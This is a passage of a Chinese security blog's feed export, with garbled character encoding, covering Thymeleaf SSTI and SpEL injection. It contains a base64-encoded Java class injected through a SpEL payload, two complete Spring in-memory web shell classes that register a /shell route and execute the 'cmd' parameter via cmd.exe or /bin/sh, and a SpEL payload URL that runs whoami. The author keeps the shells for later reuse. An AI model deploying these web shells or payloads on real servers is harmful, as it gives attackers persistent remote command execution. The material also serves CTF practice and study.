ZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8BAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBADsoW0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDspVgEABXBhdGhzAQAHQnVpbGRlcgEAXChbTGphdmEvbGFuZy9TdHJpbmc7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvJEJ1aWxkZXI7AQBFb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAHb3B0aW9ucwEAnShMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyQ29uZmlndXJhdGlvbjspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAAVidWlsZAEAQSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgAhAA8ACwAAAAAAAwABACsALAABAC0AAAAvAAEAAQAAAAUqtwABsQAAAAIALgAAAAYAAQAAAAwALwAAAAwAAQAAAAUAMAAxAAAACQAyADMAAgAtAAABoQAHAAkAAACqEgJMKrYAA00sEgS2AAVOLQS2AAYtKrYAB8AACDoEKrYAAxIJBr0AClkDEgtTWQQSC1NZBRIMU7YADToFGQUEtgAOEg8SEAS9AApZAxIRU7YAEjoGuwATWQO9ABS3ABU6BwS9ABFZAxIWU7gAFxkEuQAYAgC5ABkBADoIGQUqBr0AC1kDGQhTWQS7AA9ZtwAaU1kFGQZTtgAbVxIcTKcAC00stgAeEh9MK7AAAQADAJ0AoAAdAAQALgAAAEYAEQAAAA4AAwAQAAgAEQAPABIAFAATAB4AFQA8ABYAQgAXAFQAGABhABoAewAcAJoAHQCdACEAoAAeAKEAHwClACAAqAAiAC8AAABmAAoACACVADQANQACAA8AjgA2ADcAAwAeAH8AOAA7AAQAPABhADwAPQAFAFQASQA-AD0ABgBhADwAPwBAAAcAewAiAEEAQgAIAKEABwBDAEQAAgAAAKoARQBGAAAAAwCnAEcASAABAEkAAAAMAAEACACVADQASgACAEsAAAATAAL_AKAAAgcATAcATQABBwBOBwBPAAAABQEARQAAAAEAPgBQAAQALQAAAGgABAADAAAAJrsAIFm4ACErtgAitgAjtwAkEiW2ACa2ACdNuwAoWSyyACm3ACqwAAAAAgAuAAAACgACAAAAJgAaACcALwAAACAAAwAAACYAMAAxAAAAAAAmAFEASAABABoADABSAEgAAgBTAAAABAABAFQATwAAAAUBAFEAAABVAAAADAEAAQBWAAEAV3MAUQACAFgAAAACAFkAOgAAABIAAgAIAGEAOQAJAG8AYQCVBgk=%22),nEw%20javax.management.loading.MLet(NeW%20java.net.URL(%22http%22,%22127.0.0.1%22,%221.txt%22),T%20(java.lang.Thread).currentThread().getContextClassLoader())).doInject(T%20(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getAttribute(%22org.springframework.web.servlet.DispatcherServlet.CONTEXT%22,0).getBean(T%20(Class).forName(%22org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping%22)))%7D__::main.x<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241215001523048.png" alt="image-20241215001523048"></p><p>ç„¶åè®¿é—®&#x2F;shellè·¯ç”±cmdä¼ å‚å³å¯</p><p><img src="https://cdn.clown2024.cn/image-20241215001604905.png" alt="image-20241215001604905"></p><h2 id="springå†…å­˜é©¬"><a href="#springå†…å­˜é©¬" class="headerlink" title="springå†…å­˜é©¬"></a>springå†…å­˜é©¬</h2><p>è¿™é‡Œé¡ºä¾¿æŠŠæ–‡ç« çš„å†…å­˜é©¬è®°å½•ä¸€ä¸‹ï¼Œä»¥åæ–¹ä¾¿ç”¨</p><p><strong>&lt;2.6.0</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectToController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-comment">// ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException &#123;<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean</span><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-comment">// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­testçš„ Method å¯¹è±¡</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// é€šè¿‡åå°„è·å¾—è¯¥ç±»çš„testæ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-comment">// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€</span><br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-comment">// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰</span><br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-comment">// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller</span><br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">// åˆ›å»ºç”¨äºå¤„ç†è¯·æ±‚çš„å¯¹è±¡ï¼ŒåŠ å…¥&quot;aaa&quot;å‚æ•°æ˜¯ä¸ºäº†è§¦å‘ç¬¬äºŒä¸ªæ„é€ å‡½æ•°é¿å…æ— é™å¾ªç¯</span><br>        <span class="hljs-type">InjectToController</span> <span class="hljs-variable">injectToController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        mappingHandlerMapping.registerMapping(info, injectToController, method2);<br>    &#125;<br>    <span class="hljs-comment">// ç¬¬äºŒä¸ªæ„é€ å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController</span><span class="hljs-params">(String aaa)</span> &#123;&#125;<br><br>    <span class="hljs-comment">// controlleræŒ‡å®šçš„å¤„ç†æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  IOException&#123;<br>        <span class="hljs-comment">// è·å–requestå’Œresponseå¯¹è±¡</span><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br><br>        <span class="hljs-comment">//exec</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next(): o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">//å½“è¯·æ±‚æ²¡æœ‰æºå¸¦æŒ‡å®šçš„å‚æ•°(code)æ—¶ï¼Œè¿”å› 404 é”™è¯¯</span><br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> com.sun.org.apache.xalan.internal.xsltc.TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>&gt;&#x3D;2.6.0</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InjectToController2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController2</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">configField</span> <span class="hljs-operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>            configField.setAccessible(<span class="hljs-literal">true</span>);<br>            RequestMappingInfo.<span class="hljs-type">BuilderConfiguration</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> InjectToController2.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>            <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> RequestMappingInfo.paths(<span class="hljs-string">&quot;/shell&quot;</span>).options(config).build();<br>            <span class="hljs-type">InjectToController2</span> <span class="hljs-variable">springControllerMemShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InjectToController2</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InjectToController2</span><span class="hljs-params">(String aaa)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.htm">https://justdoittt.top/2024/03/24/Thymeleaf%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/index.htm</a></p><p><a href="https://cn-sec.com/archives/3118198.html">https://cn-sec.com/archives/3118198.html</a></p><p><a href="https://forum.butian.net/share/1922">https://forum.butian.net/share/1922</a></p><p><a href="https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D">https://xz.aliyun.com/t/11688?time__1311=Cq0xRQKQq7qmqGNDQiiQqPGI3oLfObQWa4D</a></p><p><a href="http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å†æ¥æ°´ä¸€ç¯‡Thymeleafçš„sstiï¼Œèµ·å› æ˜¯çœ‹åˆ°å¸ˆå…„ä»¥å‰å‡ºçš„é¢˜ç›®ï¼Œé‡Œé¢æœ‰ä¸€ç‚¹å°å‘ï¼Œç´¢å¼•å°±æŠŠThymeleafç¨å¾®é«˜ç‰ˆæœ¬ä¸€äº›çš„æ¼æ´å†è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;h1 id=&quot;thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨&quot;&gt;&lt;a href=&quot;#thymeleafé«˜ç‰ˆæœ¬åˆ©ç”¨&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>SPELè¡¨è¾¾å¼æ³¨å…¥</title>
    <link href="https://clowsman.github.io/2024/12/14/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <id>https://clowsman.github.io/2024/12/14/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</id>
    <published>2024-12-13T17:37:45.000Z</published>
    <updated>2024-12-14T06:39:43.069Z</updated>
    
    <content type="html"><![CDATA[<p>èµ¶ç´§æ¥è¡¥ä¸€ä¸‹SPELè¡¨è¾¾å¼æ³¨å…¥ï¼Œå‰é¢Thymeleafæœ¬è´¨ç”¨çš„å°±æ˜¯SPELè¡¨è¾¾å¼</p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Springè¡¨è¾¾å¼è¯­è¨€ï¼ˆç®€ç§° <strong>SpEL</strong>ï¼Œå…¨ç§°<strong>Spring Expression Language</strong>ï¼‰æ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œæ”¯æŒåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å’Œæ“ä½œå¯¹è±¡å›¾ã€‚å®ƒè¯­æ³•ç±»ä¼¼äºOGNLï¼ŒMVELå’ŒJBoss ELï¼Œåœ¨æ–¹æ³•è°ƒç”¨å’ŒåŸºæœ¬çš„å­—ç¬¦ä¸²æ¨¡æ¿æä¾›äº†æå¤§åœ°ä¾¿åˆ©ï¼Œä¹Ÿå¼€å‘å‡è½»äº†Javaä»£ç é‡ã€‚å¦å¤– , SpELæ˜¯Springäº§å“ç»„åˆä¸­è¡¨è¾¾è¯„ä¼°çš„åŸºç¡€ï¼Œä½†å®ƒå¹¶ä¸ç›´æ¥ä¸Springç»‘å®š,å¯ä»¥ç‹¬ç«‹ä½¿ç”¨ã€‚</p><h1 id="demoç¤ºä¾‹"><a href="#Demoç¤ºä¾‹" class="headerlink" title="Demoç¤ºä¾‹"></a>Demoç¤ºä¾‹</h1><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.spel;<br><br><br><span class="hljs-keyword">import</span> org.springframework.expression.Expression;<br><span class="hljs-keyword">import</span> org.springframework.expression.ExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpElController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/spelTest&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">catUser</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(message);<br>        <span class="hljs-keyword">return</span> expression.getValue().toString(); <span class="hljs-comment">//è·å–è¡¨è¾¾å¼æ‰§è¡Œçš„ç»“æœ</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘ä»¬ä¼ ä¸€ä¸ªç”Ÿæˆéšæœºæ•°çš„è¡¨è¾¾å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=T(java.lang.Math).random()*100<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241214130112061.png" alt="image-20241214130112061"></p><p>ä¸‹é¢çš„å½¢å¼å¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://localhost:8081/spelTest?message=new%20java.lang.ProcessBuilder(%22whoami%22).start() <br></code></pre></td></tr></table></figure><h1 id="spelè¯­æ³•"><a href="#SpElè¯­æ³•" class="headerlink" title="SpElè¯­æ³•"></a>SpElè¯­æ³•</h1><p>spelç”¨<code>#&#123;...&#125;</code>ä½œä¸ºç•Œå®šç¬¦ï¼Œæ‰€æœ‰åœ¨å¤§æ‹¬å·ä¸­çš„å­—ç¬¦éƒ½å°†è¢«è®¤ä¸ºæ˜¯ SpELè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å…¶ä¸­ä½¿ç”¨è¿ç®—ç¬¦ï¼Œå˜é‡ä»¥åŠå¼•ç”¨beanï¼Œå±æ€§å’Œæ–¹æ³•</p><ul><li>å¼•ç”¨å…¶ä»–å¯¹è±¡:<code>#&#123;car&#125;</code></li><li>å¼•ç”¨å…¶ä»–å¯¹è±¡çš„å±æ€§ï¼š<code>#&#123;car.brand&#125;</code></li><li>è°ƒç”¨å…¶å®ƒæ–¹æ³• , 